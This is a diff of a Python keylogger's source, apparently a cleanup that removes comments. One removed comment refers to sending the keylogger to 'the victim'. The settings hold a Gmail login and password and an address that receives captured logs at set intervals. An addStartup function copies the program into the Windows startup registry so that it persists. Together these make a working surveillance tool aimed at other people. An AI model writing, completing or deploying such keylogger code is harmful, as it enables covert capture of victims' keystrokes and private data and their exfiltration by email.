@@ -11,14 +11,12 @@ global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval
 t="";pics_names=[]
 
 
-#Note: You have to edit this part from sending the keylogger to the victim
-
 #########Settings########
 
-yourgmail=""                                        #What is your gmail?
-yourgmailpass=""                                    #What is your gmail password
-sendto=""                                           #Where should I send the logs to? (any email address)
-interval=60                                         #Time to wait before sending data to email (in seconds)
+yourgmail=""                                        
+yourgmailpass=""                                    
+sendto=""                                           
+interval=60                                         
 
 ########################
 
@@ -32,7 +30,7 @@ except:
     f.close()
 
 
-def addStartup():  # this will add the file to the startup registry key
+def addStartup():  
     fp = os.path.dirname(os.path.realpath(__file__))
     file_name = sys.argv[0].split('\\')[-1]
     new_file_path = fp + '\\' + file_name
